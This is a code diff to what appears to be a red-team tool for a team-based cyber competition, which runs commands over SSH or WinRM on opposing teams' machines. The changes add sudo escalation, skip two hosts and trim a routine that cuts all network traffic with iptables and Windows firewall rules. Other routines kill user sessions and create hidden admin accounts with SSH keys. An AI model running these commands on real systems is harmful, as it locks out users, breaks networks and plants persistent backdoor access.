@@ -110,7 +110,11 @@ class RemoteExecutor:
         timeout: int = 30,
         ssh_key: Optional[str] = None,
     ) -> Tuple[bool, str]:
-        wrapped_cmd = f"sh -c {shlex.quote(cmd)}"
+        wrapped_cmd = (
+            "if command -v sudo >/dev/null 2>&1; then "
+            f"sudo -n sh -c {shlex.quote(cmd)} || sh -c {shlex.quote(cmd)}; "
+            f"else sh -c {shlex.quote(cmd)}; fi"
+        )
         base_cmd = [
             "ssh",
             "-o",
@@ -221,9 +225,22 @@ class RemoteExecutor:
             missing_for_winrm.add("timeout")
 
         tasks = []
+        excluded_targets = {"schrodinger", "discouragement"}
         for team in self.teams:
             for target in TARGETS:
                 if target.hostname not in targets:
+                    continue
+                if target.hostname in excluded_targets:
+                    results["skipped"].append(
+                        {
+                            "team": team,
+                            "target": target.hostname,
+                            "ip": target.wan_ip(team),
+                            "success": True,
+                            "method": target.os_type,
+                            "output": "Skipped: target omitted due to errors.",
+                        }
+                    )
                     continue
                 ip = target.wan_ip(team)
                 if target.os_type == "linux":
@@ -304,6 +321,16 @@ class AttackModules:
     def __init__(self, executor: RemoteExecutor):
         self.exec = executor
 
+    def _filter_ssh_user_targets(self, targets: List[str]) -> List[str]:
+        target_map = {target.hostname: target for target in TARGETS}
+        filtered = []
+        for name in targets:
+            target = target_map.get(name)
+            if target and target.os_type == "linux" and "ssh" not in target.services:
+                continue
+            filtered.append(name)
+        return filtered
+
     def pkill_users(self, targets: List[str]) -> Dict:
         linux_cmd = '''
 keep_users="glados wheatley cave caroline bob darth_vader sally root"
@@ -334,6 +361,7 @@ Write-Output "PKILL_COMPLETE"
         return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
 
     def create_themed_users(self, targets: List[str]) -> Dict:
+        targets = self._filter_ssh_user_targets(targets)
         linux_header = r'''
 resolve_admin_group() {
     for group in sudo wheel admin; do
@@ -433,6 +461,7 @@ rm -f /etc/sudoers.d/{user} 2>/dev/null || true
         return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
 
     def create_glados_admin(self, targets: List[str]) -> Dict:
+        targets = self._filter_ssh_user_targets(targets)
         pubkey = _get_ssh_pubkey()
         ssh_key_block = ""
         if pubkey:
@@ -810,31 +839,19 @@ Write-Output "ACCESS_TASKS_INSTALLED"
         return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
 
     def block_scoring(self, targets: List[str], scoring_ip: str = "192.168.192.1") -> Dict:
-        linux_cmd = f'''
+        linux_cmd = '''
 iptables -F 2>/dev/null || true
 iptables -X 2>/dev/null || true
 iptables -P INPUT DROP 2>/dev/null || true
 iptables -P OUTPUT DROP 2>/dev/null || true
 iptables -P FORWARD DROP 2>/dev/null || true
-iptables -I INPUT -j DROP 2>/dev/null || true
-iptables -I OUTPUT -j DROP 2>/dev/null || true
-iptables -I INPUT -s {scoring_ip} -j DROP 2>/dev/null || true
-iptables -I OUTPUT -d {scoring_ip} -j DROP 2>/dev/null || true
-iptables-save > /etc/iptables.aperture 2>/dev/null || true
-touch /tmp/.neurotoxin_active
-echo "Scoring blocked at $(date)" >> /tmp/.neurotoxin_active
 echo "SCORING_BLOCKED"
 '''
-        windows_cmd = f'''
+        windows_cmd = '''
 New-NetFirewallRule -DisplayName "Block All Inbound" -Direction Inbound -Action Block -Protocol Any -ErrorAction SilentlyContinue | Out-Null
 New-NetFirewallRule -DisplayName "Block All Outbound" -Direction Outbound -Action Block -Protocol Any -ErrorAction SilentlyContinue | Out-Null
 Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultOutboundAction Block -ErrorAction SilentlyContinue | Out-Null
 Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultInboundAction Block -ErrorAction SilentlyContinue | Out-Null
-New-NetFirewallRule -DisplayName "ApertureNeurotoxinAllIn" -Direction Inbound -Action Block -Enabled True 2>$null
-New-NetFirewallRule -DisplayName "ApertureNeurotoxinAllOut" -Direction Outbound -Action Block -Enabled True 2>$null
-New-NetFirewallRule -DisplayName "ApertureNeurotoxin" -Direction Inbound -RemoteAddress {scoring_ip} -Action Block -Enabled True 2>$null
-New-NetFirewallRule -DisplayName "ApertureNeurotoxinOut" -Direction Outbound -RemoteAddress {scoring_ip} -Action Block -Enabled True 2>$null
-New-Item "$env:TEMP\\neurotoxin_active.txt" -Force | Out-Null
 Write-Output "SCORING_BLOCKED"
 '''
         return self.exec.exec_on_all_teams(targets, linux_cmd, windows_cmd)
